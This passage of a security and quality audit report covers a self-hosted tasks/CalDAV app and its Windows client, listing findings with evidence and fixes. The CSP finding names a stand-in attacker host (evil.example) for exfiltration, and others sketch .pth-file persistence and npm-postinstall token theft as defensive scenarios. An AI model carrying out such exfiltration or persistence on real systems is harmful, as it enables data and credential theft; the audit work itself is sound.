already-active unit is a no-op — it does not re-exec the service with the new unit file.
The final `systemctl status` then prints an active, green unit, so the operator has
positive confirmation that looks like success while the running process is still under
the *old* unit. This is not theoretical: deploy/tasks.service was rewritten once already
(commit 7a83c8a) to add 14 hardening directives — PrivateDevices, ProtectKernelLogs,
ProtectHostname, ProtectClock, ProtectProc=invisible, RestrictNamespaces,
RestrictRealtime, RestrictSUIDSGID, SystemCallArchitectures, CapabilityBoundingSet=,
UMask=0077, IPAddressAllow/IPAddressDeny.

<details><summary>Evidence</summary>

```
deploy/setup.sh:96-100 —
echo "== systemd unit =="
install -m 0644 "$DEPLOY/tasks.service" /etc/systemd/system/tasks.service
systemctl daemon-reload
systemctl enable --now tasks.service
systemctl --no-pager --lines=6 status tasks.service || true

Failure scenario: the Pi is already running tasks.service from an earlier install. The owner pulls the commit that hardens the unit and re-runs `sudo ~/tasks/deploy/setup.sh` as DEPLOY.md instructs. The new file lands in /etc/systemd/system, daemon-reload picks it up for *future* starts, `enable --now` does nothing because the unit is already active, and `systemctl status` prints `active (running)`. The live process keeps CAP_* from the old unit, keeps a writable /proc, and — for the inverse case flagged in the unit's own comment — an operator who deletes the IPAddressAllow/IPAddressDeny lines to enable TASKS_ACCESS_REQUIRED and re-runs setup.sh still has outbound traffic blocked, so the Cloudflare Access JWKS fetch keeps failing with no indication why.
```

</details>

**Suggested fix.** Replace `systemctl enable --now tasks.service` with `systemctl enable tasks.service`
followed by `systemctl restart tasks.service`. `restart` starts a stopped unit and re-
execs a running one, so both first install and re-run converge on the unit that was just
written.

#### [x] The whole scratch-Radicale tier fails OPEN: 240 tests, including every app-level auth/authz test, skip silently and CI stays green
`backend/tests/conftest.py:35` · **medium** · test-gap

`_scratch_up` swallows ANY exception from the probe and turns it into `pytest.skip`.
That is right for a laptop with no Docker, but it is the only gate in front of the
integration tier, and nothing anywhere — pyproject, conftest, or ci.yml — asserts that
the tier actually ran. So a scratch Radicale that comes up but is not usable (wrong host
port mapping, a changed `scratch/radicale/users` htpasswd, a Radicale version whose
OPTIONS answer falls outside `expected={200,204}`, a probe that lands before the mapped
port is accepting) makes 240 tests vanish and `python -m pytest` exit 0. The compose
healthcheck does not cover this: it probes 127.0.0.1:5232 *inside* the container and
never authenticates, so it passes in exactly the cases the fixture fails on.

<details><summary>Evidence</summary>

```
tests/conftest.py:29-36:

    @pytest.fixture(scope="session")
    def _scratch_up():
        try:
            c = _make_dav(); c.options(); c.close()
        except Exception as e:  # noqa: BLE001
            pytest.skip(f"scratch Radicale unreachable on {SCRATCH_URL}: {e}")

Measured in the audit copy with Radicale down: `583 passed, 240 skipped`, exit code 0. Per-file skip counts: test_mcp 85, test_api 55, test_security 27, test_scheduling 17, test_backlog_aug19_stage1 16, test_sync 10, test_backlog_aug19_stage2 8, test_backlog_aug19_stage3_core 7, plus 12 more.

Failure scenario: someone rotates the scratch password in `scratch/radicale/users` (or bumps the Radicale image and the OPTIONS status changes). `docker compose up -d --wait` still succeeds because the healthcheck is unauthenticated and container-internal; `c.options()` gets a 401 -> DavError -> session-wide skip. The `backend` CI job passes green while `test_every_api_route_requires_auth`, `test_login_lockout_and_spoofed_ip_header`, `test_logout_withdraws_the_token_not_just_the_cookie`, `test_changing_the_password_invalidates_existing_sessions`, `test_a_foreign_origin_is_refused`, `test_static_mount_does_not_traverse` and the entire OAuth/MCP suite have not executed. A commit that removed the router-level auth dependency would merge.
```

</details>

**Suggested fix.** Make the tier fail closed in CI: have `_scratch_up` read an env flag (e.g.
`SCRATCH_REQUIRED=1`, set in ci.yml) and `pytest.fail(...)` instead of
`pytest.skip(...)` when it is set. As a cheap backstop, add a CI step that asserts a
floor on the radicale-marked tests actually collected and run (e.g. `python -m pytest -m
radicale -q` and check the passed count, or a session-finish hook that fails when
`SCRATCH_REQUIRED` is set and any `_scratch_up` skip occurred).

#### [x] The two CI supply-chain permission pins silently skip on an undeclared transitive PyYAML
`backend/tests/test_backlog_aug19_stage45.py:712` · **medium** · test-gap · minor

`test_the_build_jobs_hold_no_write_token` is the regression test for the closed finding
"desktop-release.yml grants `contents: write` at workflow scope, so `npm ci` and NuGet
restore in the build jobs run with the release-publishing token on disk" — adversary (a)
in the threat model. It, and its companion `test_the_release_job_can_still_publish`,
begin with `pytest.importorskip("yaml")`. PyYAML is not in backend/requirements.txt; it
arrives only as an extra of `uvicorn[standard]`. `importorskip` turns its absence into a
silent skip, so the pin evaporates without a single line of red.

<details><summary>Evidence</summary>

```
tests/test_backlog_aug19_stage45.py:710-712:

    # PyYAML rides in with uvicorn[standard]; skip rather than fake a pin if
    # it ever stops doing so — an ImportError is not this finding's failure.
    yaml = pytest.importorskip("yaml")

(same at line 773 for `test_the_release_job_can_still_publish`)

backend/requirements.txt names no yaml package. In the audit venv:
    pip show pyyaml -> Required-by: (empty)
    importlib.metadata.requires('uvicorn') -> "pyyaml>=5.1; extra == 'standard'"
CI's `backend` job installs only `pip install -r requirements.txt`; the separate `workflows` job does `pip install --quiet pyyaml`, which does not help the backend job.

Failure scenario: someone changes `uvicorn[standard]>=0.30` to `uvicorn>=0.30` in requirements.txt (a reasonable trim — the deploy runs plain uvicorn), or a future uvicorn drops pyyaml from the `standard` extra. Both tests skip; `pytest` exits 0 with no marker or message a reviewer would notice among the 240 other skips. A later edit that re-adds `permissions: { contents: write }` at workflow scope in ci.yml or desktop-release.yml — or that adds a new `npm ci` job under an existing write grant — then merges, restoring the exact hole in which a compromised npm postinstall script reads the release-publishing token out of `.git/config`.
```

</details>

**Suggested fix.** Add `pyyaml` to backend/requirements.txt (it is already installed in every environment
today, so this changes nothing at runtime) and replace `pytest.importorskip("yaml")`
with a plain `import yaml` at module scope, so a missing parser is a hard error rather
than a silent hole in a supply-chain guard.

#### [x] The golden-file fidelity suite ("the load-bearing suite") has no VEVENT corpus at all, so no event edit is checked for foreign-data preservation
`backend/tests/test_fidelity.py:41` · **medium** · test-gap

test_fidelity.py is the only place invariant #2 ("an edit must leave every foreign
property, parameter and subcomponent intact") is checked with the independent
canonicalizer rather than by hand-picked substring assertions. It is driven entirely off
`tests/corpus/*.ics`, which contains four files (icloud, jtx_board, tasks_org,
thunderbird) — all VTODO-only; `grep -l VEVENT tests/corpus/*.ics` returns nothing.
Every event-side write path (`apply_event_changes`, `apply_occurrence_override`,
`exclude_occurrence`, `shift_series`, `split_series`, `_detach_thisandfuture`) — the
surface with by far the most closed findings in AUDIT.md, several of which were exactly
"an edit merged/relabelled/dropped property lines" — is therefore never graded by the
canonicalizer. The only substitute is two ad-hoc `assert b"X-FOREIGN-KEEP" in …` lines
(test_recur.py:319 for `apply_occurrence_override`, test_recur.py:444 for
`shift_series`); `split_series`, which mints a brand-new resource under a fresh UID and
is the most invasive of the six, has no foreign-data assertion anywhere in the suite.

<details><summary>Evidence</summary>

```
tests/test_fidelity.py:16,40-50:

    CORPUS = sorted((Path(__file__).parent / "corpus").glob("*.ics"))
    ...
    @pytest.mark.parametrize("path", CORPUS, ids=CORPUS_IDS)
    def test_edit_preserves_foreign_data(path: Path):
        edited = apply_changes(original, TaskEdit(summary=..., status="COMPLETED"))
        assert C.signature(C.parse(original), drop=TOUCHED) == C.signature(C.parse(edited), drop=TOUCHED)

`apply_changes`/`TaskEdit` is the VTODO path only. `grep -rn "C.signature" tests/` matches nothing outside test_fidelity.py. `grep -rn "X-FOREIGN-KEEP" tests/` matches only test_concurrency.py:49,89, test_recur.py:319,444 and test_sync.py:30 — no split_series test.

The split tests that do exist (test_recur.py:329-337 `test_split_this_and_following`, :340 `test_split_delete_truncates_head`, :360 `test_an_rdate_before_the_anchor_still_leaves_a_head`, and test_backlog_aug19_stage3_ical.py's THISANDFUTURE pin) assert only occurrence starts, summaries and one LOCATION.

Failure scenario: a refactor of `split_series`' head/tail construction rebuilds the VEVENT from the properties it knows about instead of copying the component. Confirmed against the current code that head and tail today carry VALARM, ATTENDEE;CN=… and X-FOREIGN-KEEP through, so the loss would be a pure regression — and the whole backend suite stays green, because nothing asserts any of the three. The user-visible result is that "this and following" silently strips every attendee and alarm off the tail of a shared meeting series, permanently (the tail is a new UID, so no resync restores it).
```

</details>

**Suggested fix.** Add at least one VEVENT golden file to tests/corpus/ (a recurring series with VTIMEZONE,
VALARM, ATTENDEE/ORGANIZER with parameters, EXDATE and a RECURRENCE-ID override) and a
canonicalizer-graded test per event write path: for `split_series`, compare
`C.signature(C.parse(original),
drop=TOUCHED|{'RRULE','UID','DTSTART','DTEND','RECURRENCE-ID','EXDATE','RDATE'})`
against the same signature of head and of tail. Also add `assert not CORPUS_IDS == []`
(or a fixed expected filename set) so an emptied corpus fails instead of collecting zero
parametrized cases.

#### [x] tasks.service grants the app write access to its own interpreter and source tree, contradicting the sandbox's stated invariant
`deploy/tasks.service:29` · **low** · security · stage 2

The hardening comment says ProtectHome=read-only "keeps the app from writing anywhere
under /home except the one path it needs (the SQLite cache)", and justifies the tight
sandbox with "The app parses attacker-influenced iCalendar/HTTP and is internet-
reachable through the tunnel". But ReadWritePaths names the whole backend directory,
which contains `.venv/` — the very interpreter ExecStart runs — and `tasksd/`, the
application source. The only thing the process actually needs to write there is tasks.db
plus its -wal/-shm sidecars (there is no on-disk attachment store; `grep -rn attachments
tasksd` returns nothing). Every other directive in the unit (NoNewPrivileges,
CapabilityBoundingSet=, RestrictNamespaces, ProtectSystem=strict, IPAddressDeny=any) is
aimed at containing a compromise of this process, and all of them are moot against an
attacker who can simply rewrite the code that the next restart executes as the same
user.

<details><summary>Evidence</summary>

```
deploy/tasks.service:19-29 —
# Hardening. ProtectHome=read-only keeps the app from writing anywhere under
# /home except the one path it needs (the SQLite cache). The app parses
# attacker-influenced iCalendar/HTTP and is internet-reachable through the
# tunnel, so the sandbox is tight: ...
ProtectSystem=strict
ProtectHome=read-only
ReadWritePaths=/home/nicholaskmitchell/tasks/backend
...
ExecStart=/home/nicholaskmitchell/tasks/backend/.venv/bin/python -m tasksd

Failure scenario: any file-write or code-exec primitive in the internet-reachable parse path (the threat the unit itself names) lets the process drop a one-line `.pth` file into /home/nicholaskmitchell/tasks/backend/.venv/lib/python3.12/site-packages/, or overwrite tasksd/app.py directly. Both are inside ReadWritePaths, so ProtectHome/ProtectSystem do not stop them. `Restart=on-failure`, a `systemctl restart tasks`, or the next reboot then executes the attacker's code — the compromise survives every restart, and nothing in the sandbox notices, because the write was to a path the unit deliberately opened.
```

</details>

**Suggested fix.** Move the database out of the source tree: add `StateDirectory=tasks` to the unit, set
`TASKS_DB=/var/lib/tasks/tasks.db` in /etc/tasks/tasks.env (and in deploy/setup.sh's
heredoc and tasks.env.example), and replace
`ReadWritePaths=/home/nicholaskmitchell/tasks/backend` with nothing — StateDirectory
grants exactly /var/lib/tasks and leaves the venv and source read-only. If moving the DB
is not wanted, at minimum narrow the grant to a dedicated subdirectory (e.g.
`backend/var/`) that holds only tasks.db.

**Pinned by** `test_the_unit_does_not_open_its_own_interpreter_and_source_to_writes` in `backend/tests/test_backlog_aug25_stage2.py`.

**Fixed** with the suggested fix's first option: `StateDirectory=tasks` in the unit, `TASKS_DB=/var/lib/tasks/tasks.db` in setup.sh and tasks.env.example, and `ReadWritePaths` gone entirely — so nothing under /home is writable and the venv and source are read-only like the rest of it. systemd creates and owns /var/lib/tasks itself, which is also why setup.sh gained no `install -d`: a new absolute path there would escape the four literals that `test_backlog_aug19_stage45.py`'s setup.sh harness redirects, and really create the directory on whatever machine ran the suite.

`config.py`'s fallback deliberately stays under `~`: a developer running `python -m tasksd` has no /var/lib/tasks and no systemd to make one. Production sets TASKS_DB explicitly.

**This one needs a hand on the server.** setup.sh leaves an existing `/etc/tasks/tasks.env` untouched, so an install made before this change still points TASKS_DB at a path the narrowed sandbox no longer grants, and the service will fail to open its cache. docs/DEPLOY.md gained a one-time migration block — stop, move `tasks.db` and its -wal/-shm sidecars, rewrite TASKS_DB, start — with the reminder that moving the file matters because it holds the sidecar-class tables a resync cannot rebuild.

**The pin's anti-vacuity guard was widened, deliberately and on the record.** It read `assert rw` — "the unit declares no ReadWritePaths at all, has it been renamed?" — which was a fair question while the answer was a ReadWritePaths line and the wrong one the moment the correct fix removed it: a unit with none would have been indistinguishable from a unit that had lost its writable path entirely. It now accepts `ReadWritePaths` OR `StateDirectory`, guarding the same thing (a unit that can write nowhere would not start), and the assertion that detects the finding — `opened == []` — was not touched. Confirmed by mutation: the old grant, a grant naming `.venv` directly, and no grant at all all fail.

#### [x] The published Windows client is built against a floating NuGet version with no lock file, so the shipped exe is not reproducible and its dependency set is never reviewed
`desktop/Smylte.Desktop/Smylte.Desktop.csproj:46` · **low** · security · minor

Microsoft.Web.WebView2 is referenced as `1.0.*`, and the project has no
packages.lock.json and no `RestorePackagesWithLockFile` (there is no lock file anywhere
under desktop/). Every `dotnet publish` therefore resolves whatever the newest 1.0.x is
at that instant and links it into a self-contained, unsigned Smylte.exe that is
published to the rolling `desktop-latest` release and auto-fetched by the installed
client. NuGet restore runs the resolved package's build/targets logic on the runner,
which the repo's own threat model names as a supply-chain surface (ci.yml's header:
"NuGet restore and `pip install` do the equivalent"). Two concrete consequences: (1) the
artifact ci.yml compiled and tested and the artifact desktop-release.yml published can
be built from different package sets, because they resolve independently at different
times; (2) there is no way to reproduce or bisect a previously shipped exe, because
nothing records which 1.0.x it contained.

<details><summary>Evidence</summary>

```
desktop/Smylte.Desktop/Smylte.Desktop.csproj:42-46 —
  <ItemGroup>
    <!-- The WebView2 *runtime* ships with Windows 10/11; this is only the
         managed wrapper. Floating on 1.0.* because the SDK revs constantly and
         nothing here depends on a specific build. -->
    <PackageReference Include="Microsoft.Web.WebView2" Version="1.0.*" />

Contrast the sibling reference two lines down, which is pinned: `System.Security.Cryptography.ProtectedData` Version="8.0.0". `find desktop -name packages.lock.json` returns nothing.

Failure scenario: nuget.org serves a new Microsoft.Web.WebView2 1.0.x (a bad build, or a hijacked publish). The next push to main runs desktop-release.yml, `dotnet publish` silently picks it up — no diff, no review, no CI signal, since the version is not written down anywhere in the repo — and the resulting Smylte.exe is clobbered onto `desktop-latest`, which every installed client downloads and executes on next launch. Rolling back means guessing which package version the previous good exe contained, because nothing recorded it.
```

</details>

**Suggested fix.** Pin the version explicitly (e.g. `Version="1.0.3124.44"`) or, better, add
`<RestorePackagesWithLockFile>true</RestorePackagesWithLockFile>` to both csproj files,
commit the generated packages.lock.json, and pass `--locked-mode` to the `dotnet
publish`/`dotnet build`/`dotnet test` invocations in ci.yml and desktop-release.yml so a
drifted lock file fails the build instead of silently resolving something new.

#### [x] The desktop client serves the SPA with no Content-Security-Policy — the whole policy is a response header the local server never emits
`desktop/Smylte.Desktop/LocalServer.cs:230` · **low** · security · stage 2

The app's CSP exists only as an HTTP response header attached by the backend
(`tasksd/csp.py::CSPMiddleware`), derived at startup from the served index.html so it
can carry the sha256 of the inline pre-paint script. `frontend/index.html` contains no
`<meta http-equiv="Content-Security-Policy">` (verified: zero `http-equiv` occurrences).
In the desktop client, index.html and every asset are served by
`LocalServer.ServeStatic`, which sets exactly two headers — Content-Type and Cache-
Control — so the document that runs in WebView2 has NO policy at all. `default-src
'self'`, `connect-src 'self'`, `img-src 'self'`, `object-src 'none'`, `base-uri 'none'`,
`frame-ancestors 'none'` and the script-hash allowlist are all silently absent on the
one surface that also holds a live session cookie for the real server. (The proxied /api
responses do carry the header copied from upstream, but a CSP on a JSON response governs
nothing; only the document's policy matters.)

<details><summary>Evidence</summary>

```
ServeStatic, LocalServer.cs:229-243 — the complete header set:
    var ext = Path.GetExtension(file);
    ctx.Response.ContentType = Mime.TryGetValue(ext, out var mime) ? mime : "application/octet-stream";
    ctx.Response.AddHeader("Cache-Control", ext.Equals(".html", ...) ? "no-cache" : "public, max-age=31536000, immutable");
    var bytes = File.ReadAllBytes(file);
No Content-Security-Policy, no X-Content-Type-Options.

csp.py's own docstring states what is being lost: "Those are allowlists over *named fields*. This is the bound over the rest: the next value that reaches a style declaration, an `img` src or a script tag is otherwise undefended in exactly the same way."

Concrete scenario: a foreign CalDAV client writes a collection property or an appearance/theme value that slips past `clean_color`/`cssColor`/the appearance allowlist (the exact class of bug the audit already recorded twice as a `url()` beacon). In the browser deployment the request is blocked by `img-src 'self'` / `default-src 'self'` and never leaves the machine. In the desktop window the identical value fetches `https://evil.example/x` — and because there is also no `connect-src 'self'` and no script-hash restriction, any script injection in the desktop window can exfiltrate to an arbitrary host, from an origin whose cookie jar holds the owner's `tasks_session`.
```

</details>

**Suggested fix.** Emit the same policy from ServeStatic on the HTML document (and ideally on every static
response, as CSPMiddleware does). Compute it the same way the backend does — read the
served index.html once at LocalServer construction, sha256 each inline `<script>` body,
base64 it, and build the identical directive string — so the two cannot drift into a
blank window. Add `X-Content-Type-Options: nosniff` at the same time. A regression test
should assert the desktop response carries a policy containing the served file's script
hash.

**Pinned by** `LocalServerCspTests.TheDocumentStillCarriesNoPolicy` (live; it goes red when the policy lands) paired with the skipped `…CarriesAPolicy` in `desktop/Smylte.Desktop.Tests/LocalServerTests.cs` — xunit has no xfail.

**Fixed** as suggested: `LocalServer` reads the served index.html once at construction, sha256s each inline `<script>` body, and emits the identical directive string from `ServeStatic` — on EVERY static response, as CSPMiddleware does, plus `X-Content-Type-Options: nosniff`. `AddHeader` and not `AppendHeader`, because browsers enforce the intersection of every policy present and a duplicate is indistinguishable from a deliberate tightening.

The builder lives IN `LocalServer.cs` rather than a new file: the test project links sources by name (`<Compile Include="../Smylte.Desktop/LocalServer.cs" />`), so a new file would have to be added there too, and forgetting is silent.

The pin was a PAIR — xunit has no xfail — and the ritual `docs/STAGES.md` describes was performed: the live `TheDocumentStillCarriesNoPolicy` fired with its own instructions ("GOOD NEWS, AND AN ACTION") the moment the policy landed, and was deleted; `TheDocumentCarriesAPolicy` was un-skipped. Two assertions were added beside it, because "a policy exists" is not the corrected answer: one that the policy carries the sha256 of the script ACTUALLY SERVED (a `script-src 'self'` with no hash BLOCKS the pre-paint script, which is a blank window), computed independently of `PolicyFor` so it cannot agree with a hashing bug; and one that the SPA fallback route `/book/<token>` gets the same single header, since that path serves the document through `Resolve(...) ?? index.html`.

**One duplication no behavioural test can reach**, and it now has a reader: the two directive LISTS. Each suite only ever compares its own side, so a directive added or tightened in `csp.py` and not in the C# would go unnoticed — and the desktop window is exactly the surface nobody is looking at when they edit `build_policy`. `test_csp.py::test_the_desktop_client_builds_the_same_policy` reads `LocalServer.cs` and compares the sets. It is a source-shape assertion, which `test_backlog_stage5.py`'s header rightly disowns as a SUBSTITUTE for a behavioural one; it is not a substitute here, it is the only reader that sees both sides. Confirmed by mutation on three shapes: a directive tightened only in Python, one dropped only in the C#, and `PolicyFor` renamed away.

#### [x] `Smylte.exe --setup`, the documented way to change server or credentials, silently does nothing whenever the app is running
`desktop/Smylte.Desktop/Program.cs:239` · **low** · bug · minor

Main takes the single-instance mutex and returns before it ever looks at argv, so a
second launch — including the one carrying `--setup` — exits with no window, no message
and no exit code the user sees. MainForm offers the setup dialog only from its `Fail`
path (an app that could not start), and the window has no menu or settings affordance of
any kind, so with the app running there is no way at all to reach the dialog. The README
presents `Smylte.exe --setup` as the supported route ("## Changing settings later"), and
Settings.cs:124-128 tells the user to put a GitHub token there.

<details><summary>Evidence</summary>

```
Program.cs:238-251, in order:
    using var mutex = new Mutex(initiallyOwned: true, InstanceMutex, out var isFirst);
    if (!isFirst) return;   // already running; the existing window is the app
    ...
    var wantsSetup = args.Any(a => a.Equals("--setup", ...) || a.Equals("/setup", ...));
    if (wantsSetup || !settings.IsConfigured) { using var setup = new SetupForm(settings); ... }
`wantsSetup` is computed nine lines after the `return` that makes it unreachable.

Concrete scenario: the owner rotates the app password, has Smylte open, and runs `Smylte.exe --setup` from a shortcut or the Run box. Nothing happens — no dialog, no error, no focus change. Repeating it does nothing. The client keeps trying the old password on every launch (SeedSessionAsync silently swallows the 401) and the owner has no signal that they must close the window first. The same code also means double-clicking the icon while the window is minimised does nothing, where a single-instance app is expected to activate the existing window.
```

</details>

**Suggested fix.** Move the `wantsSetup` computation above the mutex check. When `!isFirst && wantsSetup`,
show a MessageBox saying Smylte is already running and must be closed first (or signal
the running instance to open the dialog); when `!isFirst` without `--setup`, at minimum
bring the existing window to the front instead of exiting silently.

#### [x] A syntactically invalid server address is offered as "could not be reached — save anyway?", and saying yes guarantees the client cannot start
`desktop/Smylte.Desktop/SetupForm.cs:142` · **low** · bug · minor

`Session.ProbeAsync` distinguishes an unparseable URL from an unreachable server — its
first branch returns "That is not a valid http:// or https:// address." — but
`SaveAsync` collapses both into one boolean and offers the same override prompt for
each. Overriding an unreachable host is deliberate and correct (the client works
offline). Overriding a malformed URL is never correct: `LocalServer`'s constructor calls
`new Uri(serverUrl.TrimEnd('/') + "/")`, which throws UriFormatException for a relative
string, so the settings the user just saved make startup impossible.

<details><summary>Evidence</summary>

```
SetupForm.cs:142-148:
    if (!await TestAsync().ConfigureAwait(true))
    {
        var proceed = MessageBox.Show(this,
            "That server could not be reached. Save these settings anyway?", ...);
        if (proceed != DialogResult.Yes) return;
    }
versus Session.cs:29-31, which already knows the difference:
    if (!Uri.TryCreate(serverUrl.TrimEnd('/'), UriKind.Absolute, out var parsed)
        || (parsed.Scheme != "http" && parsed.Scheme != "https"))
        return (false, "That is not a valid http:// or https:// address.");

Concrete scenario: the user types the bare hostname `radicale.nicholaskmitchell.com` (the README's own example, minus the scheme — the single most likely input error). The status line says the address is invalid, but the confirmation dialog says the server "could not be reached", so the user reasonably answers Yes assuming their box is down. Settings are written. MainForm then throws out of `new LocalServer(...)` and shows "Invalid URI: The format of the URI could not be determined.\n\nOpen settings?" — and the loop repeats every launch until the user works out that the scheme was missing.
```

</details>

**Suggested fix.** Have SaveAsync re-run the same `Uri.TryCreate` check (or have ProbeAsync return a tri-
state) and treat an unparseable address as a hard validation failure with the same
wording the status line already uses, offering no override. Optionally normalise a bare
hostname to https:// before validating.

#### [x] The update notice is docked at the wrong end of the z-order, so it covers the top 36 px of the app instead of pushing it down
`desktop/Smylte.Desktop/MainForm.cs:46` · **low** · rendering · minor · stage 4

WinForms lays docked children out in reverse child-index order: the highest index is
laid out first and takes the outer edge, index 0 is laid out last, and a
`DockStyle.Fill` child claims the whole remaining rectangle without shrinking it for the
children laid out after it. MainForm sets the opposite arrangement — the Fill web view
at the highest index (2) and the Top-docked notice strip at index 0 — so `_web` is sized
to the full client rectangle first and `_notice` is then placed in the top 36 px on top
of it. The strip is visible only because it is in front; the web content underneath is
never displaced.

<details><summary>Evidence</summary>

```
MainForm.cs:46-51:
    Controls.Add(_web);      // Dock = Fill
    Controls.Add(_splash);   // Dock = Fill
    Controls.Add(_notice);   // Dock = Top, Height = 36
    Controls.SetChildIndex(_notice, 0);
    Controls.SetChildIndex(_splash, 1);
    Controls.SetChildIndex(_web, 2);
with the comment above it asserting the opposite outcome: "the notice strip claims the top, and whichever of splash / web is visible fills what is left."

Concrete scenario: CI publishes a new Smylte.exe, so `update.ClientOutdated` is true and line 142 shows the strip. The yellow bar paints over the top 36 px of the SPA — the header row with the view tabs and date navigation — hiding those controls and swallowing clicks in that band (the Panel and its Labels are in front of the WebView2 HWND). The app looks broken until "Not now" is pressed, and the hidden region reappears only then. The same inversion is inside the strip (BuildNotice adds the Fill label last, i.e. at the highest index, so it is sized across the full strip and the two Right-docked buttons paint over its right end rather than the label ellipsising before them; it also puts "Not now" left of "Download", not "on the outside" as the comment says).
```

</details>

**Suggested fix.** Invert the indices: `SetChildIndex(_notice, 2); SetChildIndex(_splash, 1);
SetChildIndex(_web, 0);` so the Top-docked strip is laid out first and consumes its 36
px, and the Fill children receive what is left. In BuildNotice, add the Fill label first
(`message`, then `download`, then `dismiss`) for the same reason.

**Fixed** with the suggested fix in both places: `SetChildIndex(_notice, 2); _splash 1; _web 0`, and `BuildNotice` adds `message` first, then `download`, then `dismiss`.

**Both sites carried a comment stating the mechanism BACKWARDS**, which is why this survived. `MainForm`'s said the indices were set "explicitly rather than relying on the order things were added: the notice strip claims the top" — the arrangement it describes is the one it prevented. `BuildNotice`'s said "the Fill has to be added last or it claims the whole strip", when adding it last is precisely what makes it claim the whole strip. WinForms lays docked children out from the HIGHEST child index down, so the control at the back is laid out first and takes the outer edge.

**UNVERIFIED IN CI, and that is the whole reason this finding ships unpinned.** Asserting the outcome needs a Windows host with a realised control tree and a message loop. The only CI-reachable check is a `SetChildIndex` source-shape assertion, and `test_backlog_stage5.py`'s header explicitly disowns that shape: it would go green the day the indices were written in the right order and say nothing about whether the strip displaces the web view.

**NOT EVEN COMPILED where the fix was written, and the first draft of this paragraph said otherwise.** `Smylte.Desktop.csproj` is `net8.0-windows` with `UseWindowsForms`, so it cannot build on a Linux host, and `Smylte.Desktop.Tests.csproj` links `LocalServer.cs`, `Updater.cs` and `Settings.cs` — not `MainForm.cs`. Building the test project and watching its 23 tests pass therefore says nothing whatever about this change; the paragraph claimed it did. The first compile of this edit is CI's `windows-latest` job, and a green build there still says nothing about whether the strip displaces the web view.

**Verify by hand on Windows**, as STAGES.md records: publish a newer version so `ClientOutdated` is true, and check the SPA's header row is pushed DOWN rather than covered, and that "Download" and "Not now" sit beside the message rather than over it.
**Not pinned**, and docs/STAGES.md records why: WinForms lays docked children out in reverse child-index order, so asserting `_web`'s client rect needs a Windows host with a realised control tree and a message loop. The only CI-reachable pin would be a `SetChildIndex` source-shape assertion, which `test_backlog_stage5.py`'s own header explicitly disowns as a substitute for a behavioural one — it would go green on the day the indices were written in the right order and say nothing about whether the strip displaces the web view. Whoever fixes this must verify it by hand on Windows: publish a newer version so `ClientOutdated` is true, and check the SPA header row is pushed down rather than covered.

#### [x] test_sync_unit.py permanently rewrites DavClient.principal_path for the whole pytest process
`backend/tests/test_sync_unit.py:411` · **low** · bug · minor

Two tests build a bare DavClient with `DavClient.__new__` and then patch the property
with `type(c).principal_path = property(lambda self: "/u/")`. `type(c)` is the DavClient
CLASS, not the instance, so this rebinds the property on the class itself and nothing
ever restores it. Every DavClient constructed later in the same pytest process —
including the `dav`, `new_dav`, `collection` and `engine` fixtures and the real service
inside `create_app` — reports its principal path as `/u/` instead of `/{username}/`. The
file currently sorts last alphabetically (test_sync_unit.py), which is the only reason
the suite is green; it is a pure ordering accident, and the fix is a one-liner
(`monkeypatch.setattr(DavClient, "principal_path", property(...))`, or set
`c.__dict__`-free via a subclass).

<details><summary>Evidence</summary>

```
tests/test_sync_unit.py:410-411 and 540-541:

    c = DavClient.__new__(DavClient)
    type(c).principal_path = property(lambda self: "/u/")

Proved against the audit copy (backend/.venv):

    c0 = DavClient("http://127.0.0.1:5233", "testuser", "testpass")
    print(c0.principal_path)                       # -> /testuser/
    test_an_unparseable_calendar_order_is_dropped_at_the_parser()
    c1 = DavClient("http://127.0.0.1:5233", "testuser", "testpass")
    print(c1.principal_path)                       # -> /u/

Failure scenario: run `pytest tests/test_sync_unit.py tests/test_sync.py tests/test_api.py` (or add any test file that sorts after `test_sync_unit.py`, e.g. `test_tasks.py`/`test_zones.py`, or enable pytest-randomly). `_scratch_up` then calls `c.options()` against `/u/` on the scratch Radicale, which 404s, so `_make_dav().options()` raises DavError and the entire 240-test integration tier SKIPS with the message "scratch Radicale unreachable" — a false, silently-green result that looks like a Docker problem rather than a test bug. `create_task_collection` (dav/client.py:179 `f"{self.principal_path}{uuid…}/"`) would likewise write collections under the wrong principal.
```

</details>

**Suggested fix.** Use the function-scoped `monkeypatch` fixture: `monkeypatch.setattr(DavClient,
"principal_path", property(lambda self: "/u/"))` in both tests, so pytest restores the
class attribute at teardown. (Alternatively give the fake client a real `username`
attribute and drop the property patch entirely.)

#### [x] The stage-5 pin closing the "no test sends a JSON-RPC batch" gap is satisfied by a comment, not by a test
`backend/tests/test_backlog_stage5.py:146` · **low** · test-gap

`_suite_text()` concatenates the raw text of every non-backlog test file, comments and
docstrings included, and the pin is a substring search. The literal `run_batch` occurs
exactly once in that concatenation — inside a section comment in test_mcp.py — because
the batch tests drive the endpoint over HTTP and never name the function. So the pin
tracks the presence of a comment rather than the presence of a test, and it is wrong in
both directions: deleting every batch test while leaving the comment keeps it green, and
tidying the comment while keeping every test turns it red.

<details><summary>Evidence</summary>

```
tests/test_backlog_stage5.py:146:

    assert "run_batch" in _suite_text(), (
        "no test sends a JSON-RPC batch; the batch-framing path is uncovered")

The only occurrence outside the backlog files (`grep -rn run_batch tests/*.py | grep -v backlog`):

    tests/test_mcp.py:821:# AUDIT: `run_batch`'s list branch decides what a client gets back when it sends

The actual batch tests are test_mcp.py:834-935 (`test_a_batch_answers_each_request_and_keeps_its_ids`, `test_a_batch_of_only_notifications_gets_202_and_no_body`, `test_a_mixed_batch_replies_only_to_the_requests`, `test_one_bad_message_does_not_sink_the_rest_of_the_batch`, `test_an_empty_batch_is_an_invalid_request`, `test_an_oversized_batch_is_refused_whole`, `test_a_batch_is_bounded_by_the_same_scopes_as_a_single_call`) — none of which contains the string `run_batch`.

Failure scenario: a future cleanup deletes test_mcp.py lines 834-935 (say, because "batching left the 2025-06-18 revision") but leaves the `# ── JSON-RPC batch framing ──` comment block above them. `pytest -m backlog` still reports the gap as closed, and the batch-framing path — empty-batch rejection, the MAX_BATCH refusal, the all-notifications 202, per-message scope enforcement — is uncovered again on the endpoint an unauthenticated caller reaches. Compounding it: those tests carry test_mcp.py's module-level `pytest.mark.radicale` and skip without Docker, while this pin lives in a file with no such gate and reports "covered" on every Docker-less run.
```

</details>

**Suggested fix.** Make the pin depend on something a deletion removes. Either name the tests (`for t in
('test_a_batch_answers_each_request_and_keeps_its_ids',
'test_an_empty_batch_is_an_invalid_request'): assert f'def {t}' in _suite_text()`), or
strip comments from each file before concatenating in `_suite_text()` so a bare mention
cannot satisfy any of the four grep-based gap pins in this file.

